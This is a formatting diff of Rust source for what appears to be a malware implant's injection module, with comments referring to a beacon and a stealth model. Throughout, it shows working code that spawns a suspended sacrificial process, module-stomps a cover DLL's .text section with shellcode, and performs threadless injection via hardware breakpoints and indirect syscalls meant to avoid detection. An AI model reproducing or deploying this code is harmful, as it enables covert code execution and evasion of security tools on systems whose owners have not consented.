@@ -85,20 +85,20 @@ pub struct SacrificialProcess {
 /// context. The returned handles are raw and must be closed by the caller.
 pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
     type CreateProcessW = unsafe extern "system" fn(
-        *const u16,            // lpApplicationName
-        *mut u16,              // lpCommandLine (mutable per Win32)
-        *mut c_void,           // lpProcessAttributes
-        *mut c_void,           // lpThreadAttributes
-        i32,                   // bInheritHandles
-        u32,                   // dwCreationFlags
-        *mut c_void,           // lpEnvironment
-        *const u16,            // lpCurrentDirectory
-        *mut u8,               // lpStartupInfo (raw bytes, STARTUPINFOW)
-        *mut u8,               // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
+        *const u16,  // lpApplicationName
+        *mut u16,    // lpCommandLine (mutable per Win32)
+        *mut c_void, // lpProcessAttributes
+        *mut c_void, // lpThreadAttributes
+        i32,         // bInheritHandles
+        u32,         // dwCreationFlags
+        *mut c_void, // lpEnvironment
+        *const u16,  // lpCurrentDirectory
+        *mut u8,     // lpStartupInfo (raw bytes, STARTUPINFOW)
+        *mut u8,     // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
     ) -> i32;
 
-    let cp_addr = export_addr(b"kernel32.dll", b"CreateProcessW")
-        .ok_or("CreateProcessW unresolved")?;
+    let cp_addr =
+        export_addr(b"kernel32.dll", b"CreateProcessW").ok_or("CreateProcessW unresolved")?;
     let create_proc: CreateProcessW = core::mem::transmute(cp_addr);
 
     // Build a UTF-16 command line from spawn_to (mutable buffer Win32 wants).
@@ -116,16 +116,16 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
     const CREATE_SUSPENDED: u32 = 0x4;
     let ok = unsafe {
         create_proc(
-            core::ptr::null(),         // lpApplicationName (use cmd line)
-            cmd.as_mut_ptr(),          // lpCommandLine
-            core::ptr::null_mut(),     // lpProcessAttributes
-            core::ptr::null_mut(),     // lpThreadAttributes
-            0,                         // bInheritHandles
+            core::ptr::null(),     // lpApplicationName (use cmd line)
+            cmd.as_mut_ptr(),      // lpCommandLine
+            core::ptr::null_mut(), // lpProcessAttributes
+            core::ptr::null_mut(), // lpThreadAttributes
+            0,                     // bInheritHandles
             CREATE_SUSPENDED,
-            core::ptr::null_mut(),     // lpEnvironment
-            core::ptr::null(),         // lpCurrentDirectory
-            si.as_mut_ptr(),           // lpStartupInfo
-            pi.as_mut_ptr(),           // lpProcessInformation
+            core::ptr::null_mut(), // lpEnvironment
+            core::ptr::null(),     // lpCurrentDirectory
+            si.as_mut_ptr(),       // lpStartupInfo
+            pi.as_mut_ptr(),       // lpProcessInformation
         )
     };
     if ok == 0 {
@@ -135,14 +135,15 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
     // `pi` is `[u8; 24]` (1-byte aligned), so reading u64/u32 fields from it
     // requires unaligned reads — `read_unaligned` is the correct primitive
     // (no alignment precondition, unlike copy_nonoverlapping's strict contract).
-    let h_process = unsafe {
-        core::ptr::read_unaligned(pi.as_ptr() as *const u64) as *mut c_void
-    };
-    let h_thread = unsafe {
-        core::ptr::read_unaligned(pi.as_ptr().add(8) as *const u64) as *mut c_void
-    };
+    let h_process = unsafe { core::ptr::read_unaligned(pi.as_ptr() as *const u64) as *mut c_void };
+    let h_thread =
+        unsafe { core::ptr::read_unaligned(pi.as_ptr().add(8) as *const u64) as *mut c_void };
     let pid = unsafe { core::ptr::read_unaligned(pi.as_ptr().add(16) as *const u32) };
-    Ok(SacrificialProcess { handle: h_process, main_thread: h_thread, pid })
+    Ok(SacrificialProcess {
+        handle: h_process,
+        main_thread: h_thread,
+        pid,
+    })
 }
 
 /// Module-stomp inject `shellcode` into a fresh `spawn_to` process. Creates the
@@ -161,10 +162,7 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
 ///
 /// # Safety
 /// Cross-process handle + memory operations. Single-threaded beacon context.
-pub unsafe fn module_stomp(
-    spawn_to: &str,
-    shellcode: &[u8],
-) -> Result<usize, &'static str> {
+pub unsafe fn module_stomp(spawn_to: &str, shellcode: &[u8]) -> Result<usize, &'static str> {
     let proc = unsafe { create_sacrificial(spawn_to)? };
     if !modulestomp_enabled() {
         // Disarmed: return the handle without stomping. The sacrificial process
@@ -193,7 +191,10 @@ pub unsafe fn module_stomp(
 ///
 /// # Safety
 /// Cross-process handle + memory ops. Single-threaded beacon context.
-unsafe fn stomp_and_resume(proc: &SacrificialProcess, shellcode: &[u8]) -> Result<(), &'static str> {
+unsafe fn stomp_and_resume(
+    proc: &SacrificialProcess,
+    shellcode: &[u8],
+) -> Result<(), &'static str> {
     // Step 1: LoadLibraryA the cover DLL in the target. This writes the DLL
     // path string into a fresh target allocation (NOT the implant's pointer —
     // the old skeleton passed a cross-process-invalid pointer), fires
@@ -208,11 +209,15 @@ unsafe fn stomp_and_resume(proc: &SacrificialProcess, shellcode: &[u8]) -> Resul
     // remote PE headers (DOS → NT → section table). base+len are exact.
     let text = unsafe { remote_text_region(proc.handle, cover_base)? };
     // Step 3: VirtualProtectEx RX→RWX on the target's .text (real region).
-    unsafe { remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */) }?;
+    unsafe {
+        remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */)
+    }?;
     // Step 4: WriteProcessMemory the shellcode over .text (real overwrite).
     unsafe { remote_write(proc.handle, text.base, shellcode) }?;
     // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
-    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */) };
+    let _ = unsafe {
+        remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */)
+    };
     // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
     let _ = unsafe { resume_thread(proc.main_thread) };
     Ok(())
@@ -236,12 +241,8 @@ type VirtualAllocEx = unsafe extern "system" fn(
     u32,
     u32,
 ) -> *mut core::ffi::c_void;
-type VirtualFreeEx = unsafe extern "system" fn(
-    *mut core::ffi::c_void,
-    *mut core::ffi::c_void,
-    usize,
-    u32,
-) -> i32;
+type VirtualFreeEx =
+    unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void, usize, u32) -> i32;
 type WaitForSingleObject = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> u32;
 type GetExitCodeThread = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32;
 type ReadProcessMemory = unsafe extern "system" fn(
@@ -294,9 +295,8 @@ unsafe fn remote_load_library(
     let get_exit: GetExitCodeThread = core::mem::transmute(
         export_addr(b"kernel32.dll", b"GetExitCodeThread").ok_or("GetExitCodeThread")?,
     );
-    let close: CloseHandle = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?,
-    );
+    let close: CloseHandle =
+        core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?);
     let wpm: WriteProcessMemory = core::mem::transmute(
         export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
     );
@@ -304,7 +304,15 @@ unsafe fn remote_load_library(
 
     // 1. Allocate a remote page for the DLL path string.
     let path_len = dll.len(); // includes the NUL
-    let remote_path = unsafe { vax(h, core::ptr::null(), path_len, 0x3000 /* COMMIT|RESERVE */, 0x04 /* RW */) };
+    let remote_path = unsafe {
+        vax(
+            h,
+            core::ptr::null(),
+            path_len,
+            0x3000, /* COMMIT|RESERVE */
+            0x04,   /* RW */
+        )
+    };
     if remote_path.is_null() {
         return Err("VirtualAllocEx (path)");
     }
@@ -312,7 +320,9 @@ unsafe fn remote_load_library(
     let mut written: usize = 0;
     let w_ok = unsafe { wpm(h, remote_path, dll.as_ptr(), path_len, &mut written) };
     if w_ok == 0 {
-        unsafe { let _ = vfx(h, remote_path, 0, 0x8000 /* RELEASE */); }
+        unsafe {
+            let _ = vfx(h, remote_path, 0, 0x8000 /* RELEASE */);
+        }
         return Err("WriteProcessMemory (path)");
     }
     // 3. CreateRemoteThread(LoadLibraryA, remote_path). LoadLibraryA's address
@@ -366,7 +376,15 @@ unsafe fn remote_text_region(
     // Read the DOS header (first 64 bytes) to get e_lfanew.
     let mut dos = [0u8; 64];
     let mut got: usize = 0;
-    if unsafe { rpm(h, cover_base as *const _, dos.as_mut_ptr() as *mut _, 64, &mut got) } == 0
+    if unsafe {
+        rpm(
+            h,
+            cover_base as *const _,
+            dos.as_mut_ptr() as *mut _,
+            64,
+            &mut got,
+        )
+    } == 0
         || got != 64
     {
         return Err("ReadProcessMemory (DOS header)");
@@ -381,7 +399,15 @@ unsafe fn remote_text_region(
     let nt_off = cover_base + e_lfanew;
     let mut nt = [0u8; 24];
     got = 0;
-    if unsafe { rpm(h, nt_off as *const _, nt.as_mut_ptr() as *mut _, 24, &mut got) } == 0
+    if unsafe {
+        rpm(
+            h,
+            nt_off as *const _,
+            nt.as_mut_ptr() as *mut _,
+            24,
+            &mut got,
+        )
+    } == 0
         || got != 24
     {
         return Err("ReadProcessMemory (NT headers)");
@@ -397,7 +423,15 @@ unsafe fn remote_text_region(
         let mut sec = [0u8; 40];
         got = 0;
         let sec_off = sections_off + i * 40;
-        if unsafe { rpm(h, sec_off as *const _, sec.as_mut_ptr() as *mut _, 40, &mut got) } == 0
+        if unsafe {
+            rpm(
+                h,
+                sec_off as *const _,
+                sec.as_mut_ptr() as *mut _,
+                40,
+                &mut got,
+            )
+        } == 0
             || got != 40
         {
             continue; // skip unreadable section
@@ -408,7 +442,10 @@ unsafe fn remote_text_region(
             // Cap the stomp region to a sane max (never overwrite a huge .text
             // if the shellcode is tiny) — use min(section size, 0x2000).
             let len = vsize.min(0x2000);
-            return Ok(RemoteRegion { base: cover_base + vaddr, len });
+            return Ok(RemoteRegion {
+                base: cover_base + vaddr,
+                len,
+            });
         }
     }
     Err("remote cover: .text section not found")
@@ -450,9 +487,8 @@ unsafe fn remote_write(
     }
 }
 unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
-    let rt: ResumeThread = core::mem::transmute(
-        export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?,
-    );
+    let rt: ResumeThread =
+        core::mem::transmute(export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?);
     if unsafe { rt(h) } == 0xFFFFFFFF {
         Err("ResumeThread")
     } else {
@@ -501,8 +537,7 @@ pub unsafe fn threadless_inject(
     // Use the indirect syscall runtime for ALL cross-process operations —
     // consistent with the implant's stealth model (no kernel32.dll resolvents
     // in hot paths; Nt* syscalls go through the ntdll gadget trampoline).
-    let rt = crate::syscalls::global()
-        .ok_or("indirect syscall runtime not initialized")?;
+    let rt = crate::syscalls::global().ok_or("indirect syscall runtime not initialized")?;
 
     // 1. Allocate RWX in target for shellcode.
     let mut remote_base: usize = 0;
@@ -555,11 +590,7 @@ pub unsafe fn threadless_inject(
     // = 0x00100010. This tells NtGetContextThread to read/write DR0-DR3/DR6/DR7.
     ctx[0x30..0x34].copy_from_slice(&0x00100010u32.to_le_bytes());
     let get_status = unsafe {
-        crate::syscalls::nt_get_context_thread(
-            rt,
-            main_thread as usize,
-            ctx.as_mut_ptr() as usize,
-        )
+        crate::syscalls::nt_get_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
     };
     if get_status.is_none() || get_status.unwrap() < 0 {
         let mut dummy: u32 = 0;
@@ -574,17 +605,15 @@ pub unsafe fn threadless_inject(
     //     state or silent breakpoint fire collision.
     const DR_OFFSETS: [usize; 4] = [0x048, 0x050, 0x058, 0x060]; // DR0, DR1, DR2, DR3
     const DR7_ENABLE_BITS: [u32; 4] = [
-        1 << 0,  // L0 — local enable for DR0
-        1 << 2,  // L1 — local enable for DR1
-        1 << 4,  // L2 — local enable for DR2
-        1 << 6,  // L3 — local enable for DR3
+        1 << 0, // L0 — local enable for DR0
+        1 << 2, // L1 — local enable for DR1
+        1 << 4, // L2 — local enable for DR2
+        1 << 6, // L3 — local enable for DR3
     ];
     let mut slot: Option<usize> = None;
     let mut dr7 = u64::from_le_bytes(ctx[0x070..0x078].try_into().unwrap());
     for i in 0..4 {
-        let val = u64::from_le_bytes(
-            ctx[DR_OFFSETS[i]..DR_OFFSETS[i] + 8].try_into().unwrap()
-        );
+        let val = u64::from_le_bytes(ctx[DR_OFFSETS[i]..DR_OFFSETS[i] + 8].try_into().unwrap());
         if val == 0 && (dr7 & DR7_ENABLE_BITS[i] as u64) == 0 {
             slot = Some(i);
             break;
@@ -618,11 +647,7 @@ pub unsafe fn threadless_inject(
     //    CONTEXT_ALL (0x10001F) = all flags — safe and unambiguous.
     ctx[0x30..0x34].copy_from_slice(&0x0010_001Fu32.to_le_bytes());
     let set_status = unsafe {
-        crate::syscalls::nt_set_context_thread(
-            rt,
-            main_thread as usize,
-            ctx.as_mut_ptr() as usize,
-        )
+        crate::syscalls::nt_set_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
     };
     if set_status.is_none() || set_status.unwrap() < 0 {
         let mut dummy: u32 = 0;
@@ -658,12 +683,7 @@ pub unsafe fn threadless_inject(
 /// sacrificial process is spawned (spawn_to, default "notepad.exe").
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
-pub fn do_inject(
-    method: u8,
-    pid: u32,
-    spawn_to: &str,
-    shellcode: &[u8],
-) -> nyx_protocol::Response {
+pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
     // method 0 (Pool Party) not yet implemented — delegate to module stomp
     // (method 2) so the command works end-to-end today. When Pool Party
     // lands, this dispatch arm gets its own path.
@@ -672,7 +692,11 @@ pub fn do_inject(
     match effective_method {
         1 => {
             // Threadless HWBP: needs a sacrificial process for the thread handle.
-            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
+            let target = if spawn_to.is_empty() {
+                "notepad.exe"
+            } else {
+                spawn_to
+            };
             match unsafe { create_sacrificial(target) } {
                 Ok(proc) => {
                     let trigger = proc.main_thread as usize; // self-trigger on resume
@@ -685,33 +709,26 @@ pub fn do_inject(
                             )
                             .into_bytes(),
                         ),
-                        Err(e) => nyx_protocol::Response::Err(
-                            crate::heap::String::from(e),
-                        ),
+                        Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
                     }
                 }
-                Err(e) => nyx_protocol::Response::Err(
-                    crate::heap::String::from(e),
-                ),
+                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
             }
         }
         2 => {
             // Module stomp: spawn-to sacrificial + .text overwrite.
-            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
+            let target = if spawn_to.is_empty() {
+                "notepad.exe"
+            } else {
+                spawn_to
+            };
             match unsafe { module_stomp(target, shellcode) } {
                 Ok(_handle) => nyx_protocol::Response::Output(
-                    crate::heap::String::from(
-                        "module stomp inject ok",
-                    )
-                    .into_bytes(),
+                    crate::heap::String::from("module stomp inject ok").into_bytes(),
                 ),
-                Err(e) => nyx_protocol::Response::Err(
-                    crate::heap::String::from(e),
-                ),
+                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
             }
         }
-        _ => nyx_protocol::Response::Err(
-            crate::heap::String::from("unknown inject method"),
-        ),
+        _ => nyx_protocol::Response::Err(crate::heap::String::from("unknown inject method")),
     }
 }
